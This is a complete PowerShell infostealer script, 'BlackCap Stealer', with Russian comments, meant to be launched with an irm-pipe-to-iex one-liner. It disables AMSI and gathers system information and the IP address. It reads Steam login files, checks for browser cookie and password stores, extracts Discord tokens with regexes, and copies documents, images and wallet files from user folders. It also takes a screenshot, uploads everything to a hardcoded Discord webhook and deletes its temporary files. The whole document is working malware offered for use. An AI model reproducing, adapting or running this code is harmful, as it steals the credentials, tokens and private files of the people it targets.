# BlackCap Stealer - Простой и эффективный
# Одна команда: irm <ссылка> | iex

$webhook = "https://discord.com/api/webhooks/1408438938825261061/YXYXSKpdkkthcKDbB2PR8A8wRrWBGm5h4bbRTFy1j-50cN3xFNE_Z_Bt9nfNDCzWdFkF"

# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Функция отправки на Discord
function Send-Discord {
    param([string]$content)
    try {
        $payload = @{ content = $content } | ConvertTo-Json
        Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 10
    } catch { }
}

# Функция отправки файла
function Send-File {
    param([string]$filePath)
    try {
        $bytes = [System.IO.File]::ReadAllBytes($filePath)
        $base64 = [System.Convert]::ToBase64String($bytes)
        $fileName = [System.IO.Path]::GetFileName($filePath)
        $payload = @{ 
            file = $base64
            filename = $fileName
        } | ConvertTo-Json
        Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 30
    } catch { }
}

# Функция создания ZIP
function Create-Zip {
    param([string]$sourcePath, [string]$zipPath)
    try {
        if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::CreateFromDirectory($sourcePath, $zipPath)
        return $true
    } catch {
        return $false
    }
}

# Функция кражи Steam
function Get-SteamData {
    $steamPaths = @(
        "${env:ProgramFiles(x86)}\Steam",
        "${env:ProgramFiles}\Steam", 
        "${env:LOCALAPPDATA}\Steam"
    )
    
    $steamPath = $steamPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
    if (!$steamPath) { return "Steam: Not found" }
    
    $data = "**Steam Data**`n"
    $data += "Path: $steamPath`n"
    
    # SSFN файлы
    $ssfnFiles = Get-ChildItem "$steamPath\ssfn*" -ErrorAction SilentlyContinue
    if ($ssfnFiles) {
        $data += "SSFN Files: $($ssfnFiles.Count) found`n"
        $ssfnFiles | ForEach-Object { $data += "- $($_.Name)`n" }
    }
    
    # loginusers.vdf
    $loginusers = "$steamPath\config\loginusers.vdf"
    if (Test-Path $loginusers) {
        $content = Get-Content $loginusers -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
        if ($content) {
            $data += "LoginUsers: Found`n"
            $data += "Content: $($content.Substring(0, [Math]::Min(500, $content.Length)))...`n"
        }
    }
    
    # config.vdf
    $config = "$steamPath\config\config.vdf"
    if (Test-Path $config) {
        $data += "Config: Found`n"
    }
    
    return $data
}

# Функция кражи браузеров
function Get-BrowserData {
    $data = "**Browser Data**`n"
    
    # Chrome
    $chromePath = "${env:LOCALAPPDATA}\Google\Chrome\User Data\Default"
    if (Test-Path $chromePath) {
        $data += "**Chrome**`n"
        
        # Cookies
        $cookiesPath = "$chromePath\Network\Cookies"
        if (Test-Path $cookiesPath) {
            $data += "Cookies: Found`n"
        }
        
        # Login Data
        $loginPath = "$chromePath\Login Data"
        if (Test-Path $loginPath) {
            $data += "Passwords: Found`n"
        }
        
        # History
        $historyPath = "$chromePath\History"
        if (Test-Path $historyPath) {
            $data += "History: Found`n"
        }
        
        # Web Data
        $webDataPath = "$chromePath\Web Data"
        if (Test-Path $webDataPath) {
            $data += "Web Data: Found`n"
        }
    }
    
    # Edge
    $edgePath = "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\Default"
    if (Test-Path $edgePath) {
        $data += "**Edge**`n"
        
        $cookiesPath = "$edgePath\Network\Cookies"
        if (Test-Path $cookiesPath) {
            $data += "Cookies: Found`n"
        }
        
        $loginPath = "$edgePath\Login Data"
        if (Test-Path $loginPath) {
            $data += "Passwords: Found`n"
        }
        
        $historyPath = "$edgePath\History"
        if (Test-Path $historyPath) {
            $data += "History: Found`n"
        }
    }
    
    # Firefox
    $firefoxPath = "${env:APPDATA}\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxPath) {
        $data += "**Firefox**`n"
        $profiles = Get-ChildItem $firefoxPath -Directory
        foreach ($profile in $profiles) {
            $cookiesPath = "$($profile.FullName)\cookies.sqlite"
            if (Test-Path $cookiesPath) {
                $data += "Cookies: Found in $($profile.Name)`n"
            }
            
            $loginsPath = "$($profile.FullName)\logins.json"
            if (Test-Path $loginsPath) {
                $data += "Logins: Found in $($profile.Name)`n"
            }
        }
    }
    
    return $data
}

# Функция кражи Discord
function Get-DiscordData {
    $data = "**Discord Data**`n"
    
    $discordPaths = @(
        "${env:APPDATA}\Discord",
        "${env:LOCALAPPDATA}\Discord",
        "${env:APPDATA}\discordcanary",
        "${env:APPDATA}\discordptb"
    )
    
    foreach ($path in $discordPaths) {
        if (Test-Path $path) {
            $leveldbPath = "$path\Local Storage\leveldb"
            if (Test-Path $leveldbPath) {
                $data += "Discord: $path`n"
                
                # Ищем токены в файлах
                $files = Get-ChildItem $leveldbPath -File | Where-Object { $_.Name -like "*.ldb" -or $_.Name -like "*.log" }
                foreach ($file in $files) {
                    try {
                        $content = Get-Content $file.FullName -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
                        if ($content -match "mfa\.[a-zA-Z0-9_-]{84}") {
                            $data += "MFA Token: $($matches[0])`n"
                        }
                        if ($content -match "[a-zA-Z0-9_-]{23,28}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27}") {
                            $data += "Token: $($matches[0])`n"
                        }
                    } catch { }
                }
            }
        }
    }
    
    return $data
}

# Функция системной информации
function Get-SystemInfo {
    $data = "**System Info**`n"
    
    $data += "Username: $env:USERNAME`n"
    $data += "Computer: $env:COMPUTERNAME`n"
    $data += "OS: $((Get-WmiObject Win32_OperatingSystem).Caption)`n"
    $data += "Architecture: $env:PROCESSOR_ARCHITECTURE`n"
    $data += "Admin: $([Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains 'S-1-5-32-544')`n"
    
    # IP и локация
    try {
        $ip = (Invoke-RestMethod -Uri "https://ipinfo.io/json" -TimeoutSec 5).ip
        $data += "IP: $ip`n"
    } catch { }
    
    return $data
}

# Функция скриншота
function Get-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
        
        $tempPath = "$env:TEMP\screenshot.png"
        $bitmap.Save($tempPath, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bitmap.Dispose()
        
        return $tempPath
    } catch {
        return $null
    }
}

# Функция кражи файлов
function Get-ImportantFiles {
    $data = "**Important Files**`n"
    $filesToSteal = @()
    
    $paths = @(
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Documents", 
        "$env:USERPROFILE\Downloads"
    )
    
    $extensions = @("*.txt", "*.doc", "*.docx", "*.pdf", "*.xls", "*.xlsx", "*.db", "*.sqlite", "*.wallet", "*.dat", "*.png", "*.jpg", "*.jpeg", "*.gif", "*.bmp")
    
    foreach ($path in $paths) {
        if (Test-Path $path) {
            foreach ($ext in $extensions) {
                $files = Get-ChildItem $path -Filter $ext -Recurse -ErrorAction SilentlyContinue | Select-Object -First 5
                if ($files) {
                    $data += "$path ($ext): $($files.Count) files`n"
                    foreach ($file in $files) {
                        $data += "- $($file.Name) ($([Math]::Round($file.Length/1KB, 2)) KB)`n"
                        $filesToSteal += $file.FullName
                    }
                }
            }
        }
    }
    
    return $data, $filesToSteal
}

# Главная функция
function Start-Stealer {
    $report = "**BlackCap Stealer Report**`n"
    $report += "Time: $(Get-Date)`n`n"
    
    # Собираем данные
    $report += Get-SystemInfo
    $report += "`n"
    $report += Get-SteamData  
    $report += "`n"
    $report += Get-BrowserData
    $report += "`n"
    $report += Get-DiscordData
    $report += "`n"
    
    $fileInfo, $files = Get-ImportantFiles
    $report += $fileInfo
    $report += "`n"
    
    # Отправляем отчет
    Send-Discord $report
    
    # Создаем временную папку для файлов
    $tempDir = "$env:TEMP\stolen_files"
    if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
    
    # Копируем файлы
    foreach ($file in $files) {
        try {
            $dest = "$tempDir\$([System.IO.Path]::GetFileName($file))"
            Copy-Item $file $dest -Force
        } catch { }
    }
    
    # Создаем ZIP и отправляем
    $zipPath = "$env:TEMP\stolen_data.zip"
    if (Create-Zip $tempDir $zipPath) {
        Send-File $zipPath
        Remove-Item $zipPath -Force
    }
    
    # Скриншот
    $screenshot = Get-Screenshot
    if ($screenshot) {
        Send-File $screenshot
        Remove-Item $screenshot -Force
    }
    
    # Очищаем следы
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    Start-Sleep 2
}

# Запускаем стиллер
Start-Stealer

